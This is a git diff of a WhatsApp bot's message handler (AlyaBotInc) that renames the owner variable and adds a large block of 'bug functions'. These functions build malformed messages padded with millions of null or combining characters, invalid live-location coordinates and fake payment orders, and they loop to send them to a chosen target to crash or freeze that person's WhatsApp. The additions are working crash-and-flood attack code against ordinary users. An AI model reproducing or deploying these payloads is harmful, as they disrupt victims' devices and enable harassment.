@@ -276,8 +276,8 @@ module.exports = AlyaBotInc = async (AlyaBotInc, m, msg, chatUpdate, store) => {
         const isXeonMedia = m.mtype
         //user status
         const isUser = xeonverifieduser.includes(sender)
-        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-        const isPremium= XeonTheCreator || checkPremiumUser(m.sender, premium)
+        const AlyaTheQueen = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isPremium= AlyaTheQueen || checkPremiumUser(m.sender, premium)
         expiredPremiumCheck(AlyaBotInc, m, premium)
         
         //theme sticker reply
@@ -307,7 +307,439 @@ module.exports = AlyaBotInc = async (AlyaBotInc, m, msg, chatUpdate, store) => {
         }
  
  //bug functions
-const abug2 = {
+const force = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./AlyaBugs/xx1.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌟STAR KING 🌟STAR KING 🌟STAR KING\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
+
+const force2 = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./AlyaBugs/xx1.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌟STAR KING 🌟STAR KING 🌟STAR KING\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
+
+const oneclickalya = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+listResponseMessage: {
+title: `🌟STAR KING`
+}
+}
+}
+
+const sendReaction = async reactionContent => {
+  AlyaBotInc.sendMessage(m.chat, {
+    'react': {
+      'text': reactionContent,
+      'key': m.key
+    }
+  });
+};
+
+async function blackening(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "stickerMessage": {
+    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
+    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+    "mimetype": "image/webp",
+    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
+    "fileLength": "10116",
+    "mediaKeyTimestamp": "1715876003",
+    "isAnimated": false,
+    "stickerSentTs": "1715881084144",
+    "isAvatar": false,
+    "isAiSticker": false,
+    "isLottie": false
+  }
+}), { userJid: target, quoted: kuwoted });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function locationalya(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `🌟STAR KING 🌟STAR KING 🌟STAR KING`+"ꦾ".repeat(1000000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
+
+async function alyakillpic(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    interactiveMessage: {
+      header: {
+        title: "🌟STAR KING",
+        hasMediaAttachment: true,
+        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/23599f1469b9c50660c4d.jpg" } }, { upload: AlyaBotInc.waUploadToServer }))
+      },
+      body: {
+        text: ""
+      },
+      footer: {
+        text: "›          #🌟STAR KING"
+      },
+      nativeFlowMessage: {
+        messageParamsJson: " ".repeat(10000000)
+      }
+    }
+}), { userJid: target, quoted: kuwoted });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function aipong(target) {
+await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+}
+
+async function listxeonfck(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  'listMessage': {
+    'title': "🌟STAR KING"+" ".repeat(920000),
+        'footerText': `🌟STAR KING 🌟STAR KING 🌟STAR KING`,
+        'description': `🌟STAR KING 🌟STAR KING 🌟STAR KING`,
+        'buttonText': null,
+        'listType': 2,
+        'productListInfo': {
+          'productSections': [{
+            'title': 'anjay',
+            'products': [
+              { "productId": "4392524570816732" }
+            ]
+          }],
+          'productListHeaderImage': {
+            'productId': '4392524570816732',
+            'jpegThumbnail': null
+          },
+          'businessOwnerJid': '0@s.whatsapp.net'
+        }
+      },
+      'footer': 'puki',
+      'contextInfo': {
+        'expiration': 604800,
+        'ephemeralSettingTimestamp': "1679959486",
+        'entryPointConversionSource': "global_search_new_chat",
+        'entryPointConversionApp': "whatsapp",
+        'entryPointConversionDelaySeconds': 5,
+        'disappearingMode': {
+          'initiator': "INITIATED_BY_ME"
+        }
+      },
+      'selectListType': 2,
+      'product_header_info': {
+        'product_header_info_id': 292928282928,
+        'product_header_is_rejected': false
+      }
+    }), { userJid: target, quoted: oneclickalya });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function sendRepeatedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+   AlyaBotInc.sendMessage(recipientJid, {
+      'text': ''.repeat(1000000)
+    }, {
+      'participant': {
+        'jid': jid
+      },
+      'messageId': etc.key.id
+    }, {
+      'quoted': m
+    });
+  }
+}
+
+async function sendViewOnceMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    let messageContent = generateWAMessageFromContent(jid, {
+      'viewOnceMessage': {
+        'message': {
+          'messageContextInfo': {
+            'deviceListMetadata': {},
+            'deviceListMetadataVersion': 2
+          },
+          'interactiveMessage': proto.Message.InteractiveMessage.create({
+            'body': proto.Message.InteractiveMessage.Body.create({
+              'text': ''
+            }),
+            'footer': proto.Message.InteractiveMessage.Footer.create({
+              'text': ''
+            }),
+            'header': proto.Message.InteractiveMessage.Header.create({
+              'title': '',
+              'subtitle': '',
+              'hasMediaAttachment': false
+            }),
+            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(1000000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(1000000)
+            })
+          })
+        }
+      }
+    }, {});
+    AlyaBotInc.relayMessage(jid, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
+  }
+}
+
+async function sendSystemCrashMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'interactiveMessage': {
+          'header': {
+            'title': '',
+            'subtitle': " "
+          },
+          'body': {
+            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
+          },
+          'footer': {
+            'text': 'xp'
+          },
+          'nativeFlowMessage': {
+            'buttons': [{
+              'name': 'cta_url',
+              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
+            }],
+            'messageParamsJson': "\0".repeat(10000000)
+          }
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+async function sendListMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'listMessage': {
+      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(92000000),
+      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'buttonText': null,
+      'listType': 2,
+      'productListInfo': {
+        'productSections': [{
+          'title': "lol",
+          'products': [{
+            'productId': "4392524570816732"
+          }]
+        }],
+        'productListHeaderImage': {
+          'productId': "4392524570816732",
+          'jpegThumbnail': null
+        },
+        'businessOwnerJid': "0@s.whatsapp.net"
+      }
+    },
+    'footer': "lol",
+    'contextInfo': {
+      'expiration': 6000000,
+      'ephemeralSettingTimestamp': "1679959486",
+      'entryPointConversionSource': "global_search_new_chat",
+      'entryPointConversionApp': "whatsapp",
+      'entryPointConversionDelaySeconds': 5,
+      'disappearingMode': {
+        'initiator': "INITIATED_BY_ME"
+      }
+    },
+    'selectListType': 2,
+    'product_header_info': {
+      'product_header_info_id': 292928282928,
+      'product_header_is_rejected': false
+    }
+  }), {
+    'userJid': jid
+  });
+  
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+
+async function sendLiveLocationMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'liveLocationMessage': {
+          'degreesLatitude': 'p',
+          'degreesLongitude': 'p',
+          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(1000000),
+          'sequenceNumber': '0',
+          'jpegThumbnail': ''
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  
+  await AlyaBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+
+async function sendExtendedTextMessage(jid) {
+  AlyaBotInc.relayMessage(jid, {
+    'extendedTextMessage': {
+      'text': '.',
+      'contextInfo': {
+        'stanzaId': jid,
+        'participant': jid,
+        'quotedMessage': {
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(1000000)
+        },
+        'disappearingMode': {
+          'initiator': "CHANGED_IN_CHAT",
+          'trigger': "CHAT_SETTING"
+        }
+      },
+      'inviteLinkGroupTypeV2': "DEFAULT"
+    }
+  }, {
+    'participant': {
+      'jid': jid
+    }
+  }, {
+    'messageId': null
+  });
+}
+async function sendPaymentInvite(jid) {
+  AlyaBotInc.relayMessage(jid, {
+    'paymentInviteMessage': {
+      'serviceType': "UPI",
+      'expiryTimestamp': Date.now() + 86400000
+    }
+  }, {
+    'participant': {
+      'jid': jid
+    }
+  });
+}
+
+async function sendMultiplePaymentInvites(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendPaymentInvite(jid);
+    sendExtendedTextMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendVariousMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendListMessage(jid);
+    sendLiveLocationMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendRepeatedMessages2(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendSystemCrashMessage(jid);
+    sendSystemCrashMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendMixedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendLiveLocationMessage(jid);
+    sendListMessage(jid);
+    await sleep(500);
+  }
+}
+
+function sendMessageWithMentions(text, mentions = [], quoted = false) {
+  if (quoted == null || quoted == undefined || quoted == false) {
+    return AlyaBotInc.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  } else {
+    return AlyaBotInc.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  }
+}
+
+const xbug2 = {
 key: {
 remoteJid: 'status@broadcast',
 fromMe: false, 
@@ -318,50 +750,6 @@ listResponseMessage: {
 title: botname
 }
 }
-}
-
-const fakeflow = {
-key: {
-remoteJid: 'status@broadcast',
-fromMe: false,
-participant: '0@s.whatsapp.net'
-},
-'message': {
-"interactiveMessage": {
-"header": {
-"hasMediaAttachment": true,
-"jpegThumbnail": bimg
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
-}
-]
-}
-}
-}
-};
-//bug functions
-const subscribe_starking = {
-"key": { 
-"fromMe": false,
-"participant": '0@s.whatsapp.net',
-"remoteJid": 'status@broadcast' 
-},
-message: {
-"listResponseMessage": {
-title: `Alya is your Queen`
-}}
-}
-async function AlyaCrashy(starking,chat) {
-AlyaBotInc.sendMessage(chat, {
-document: {url: './settings.js'},
-mimetype: `image/null`,
-fileName: `${starking}.${alyatext1}` ,
-caption: `${starking + alyatext1}`,
-}, {quoted: subscribe_starking })
 }
 //end bug functions
 
@@ -854,20 +1242,20 @@ function formatDuration(ms) {
             AlyaBotInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
         }
         // Grup Only
-        if (!m.isGroup && !XeonTheCreator && db.data.settings[botNumber].onlygrub ) {
+        if (!m.isGroup && !AlyaTheQueen && db.data.settings[botNumber].onlygrub ) {
         	if (isCommand){
             return replygcalya(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
             }
         }
         // Private Only
-        if (!XeonTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
+        if (!AlyaTheQueen && db.data.settings[botNumber].onlypc && m.isGroup) {
         	if (isCommand){
 	         return replygcalya("Hello buddy! if you want to use this bot, please chat the bot in private chat")
 	     }
 	}
 	     
         if (!AlyaBotInc.public) {
-            if (XeonTheCreator && !m.key.fromMe) return
+            if (AlyaTheQueen && !m.key.fromMe) return
         }
         if (db.data.settings[botNumber].online) {
         	if (isCommand) {
@@ -914,7 +1302,7 @@ function formatDuration(ms) {
             return AlyaBotInc.updateBlockStatus(m.sender, 'block')
         } 
         if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
-        	if (XeonTheCreator || isAdmins || !isBotAdmins) return
+        	if (AlyaTheQueen || isAdmins || !isBotAdmins) return
             AlyaBotInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
             await sleep(2000)
             await AlyaBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -954,7 +1342,7 @@ return await AlyaBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 if (db.data.chats[m.chat].antipromotion) {
 if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
 if (!isBotAdmins) return
-if(XeonTheCreator) return
+if(AlyaTheQueen) return
 if (isAdmins) return
 AlyaBotInc.sendMessage(m.chat,
 			    {
@@ -976,7 +1364,7 @@ if (isGroupAdmins) return replygcalya('*VIRTEX DETECTED*')
 console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
 AlyaBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
 if (!isBotAdmins) return
-if(XeonTheCreator) return
+if(AlyaTheQueen) return
 AlyaBotInc.groupParticipantsUpdate(from, [sender], 'remove')
 await AlyaBotInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
 AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
@@ -995,7 +1383,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
  
         //anti media
         if (db.data.chats[m.chat].antimedia && isMedia) {
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1003,7 +1391,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
         if (db.data.chats[m.chat].image && isXeonMedia) {
     if(isXeonMedia === "imageMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1012,7 +1400,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
         if (db.data.chats[m.chat].antivideo && isXeonMedia) {
     if(isXeonMedia === "videoMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1021,7 +1409,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
         if (db.data.chats[m.chat].antisticker && isXeonMedia) {
     if(isXeonMedia === "stickerMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1030,7 +1418,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
         if (db.data.chats[m.chat].antiaudio && isXeonMedia) {
     if(isXeonMedia === "audioMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1039,7 +1427,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
        if (db.data.chats[m.chat].antipoll && isXeonMedia) {
     if(isXeonMedia === "pollCreationMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1048,7 +1436,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
        if (db.data.chats[m.chat].antilocation && isXeonMedia) {
     if(isXeonMedia === "locationMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1057,7 +1445,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
        if (db.data.chats[m.chat].antidocument && isXeonMedia) {
     if(isXeonMedia === "documentMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1066,7 +1454,7 @@ AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
       if (db.data.chats[m.chat].anticontact && isXeonMedia) {
     if(isXeonMedia === "contactMessage"){
-        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
+        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
         } else {
           replygcalya(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
     return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
@@ -1139,7 +1527,7 @@ await AlyaBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})
                bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
 if (isAdmins) return replygcalya(bvl)
 if (m.key.fromMe) return replygcalya(bvl)
-if (XeonTheCreator) return replygcalya(bvl)
+if (AlyaTheQueen) return replygcalya(bvl)
                await AlyaBotInc.sendMessage(m.chat,
 			    {
 			        delete: {
@@ -1157,7 +1545,7 @@ if (XeonTheCreator) return replygcalya(bvl)
                bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
 if (isAdmins) return replygcalya(bvl)
 if (m.key.fromMe) return replygcalya(bvl)
-if (XeonTheCreator) return replygcalya(bvl)
+if (AlyaTheQueen) return replygcalya(bvl)
                await AlyaBotInc.sendMessage(m.chat,
 			    {
 			        delete: {
@@ -1666,7 +2054,7 @@ sendSlide(m.chat, 'removed you', ownername, botname, slides);
 }
 break
             case 'addbadword': case 'addbd':
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (!groupAdmins) return replygcalya(mess.admin)
                if (args.length < 1) return replygcalya( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
                bad.push(q)
@@ -1674,7 +2062,7 @@ break
                replygcalya('Successfully Added Bad Word!')
             break
             case 'delbadword': case 'deldb':
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                if (!groupAdmins) return replygcalya(mess.admin)
                if (args.length < 1) return replygcalya( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
                bad.splice(q)
@@ -1683,7 +2071,7 @@ break
             break 
             case 'resetuser':
             case 'resetdbuser': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                let totalusernya = db.data.users[0]
                replygcalya(`Succesfully Deleted ${totalusernya} Users in Database`)
                db.data.users = []
@@ -1691,13 +2079,13 @@ break
             break
             case 'resethit':
             case 'resettotalhit': {
-               if (!XeonTheCreator) return AlyaStickOwner()
+               if (!AlyaTheQueen) return AlyaStickOwner()
                global.db.data.settings[botNumber].totalhit = 0
                replygcalya(mess.done)
             }
             break
             case 'setmenu': {
-            if (!XeonTheCreator) return AlyaStickOwner()
+            if (!AlyaTheQueen) return AlyaStickOwner()
             if (text.startsWith('v')) {
                   typemenu = text
                   replygcalya(mess.done)
@@ -1807,7 +2195,7 @@ await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
 break
             case 'setreply':{
-               if (!XeonTheCreator) return AlyaStickOwner()
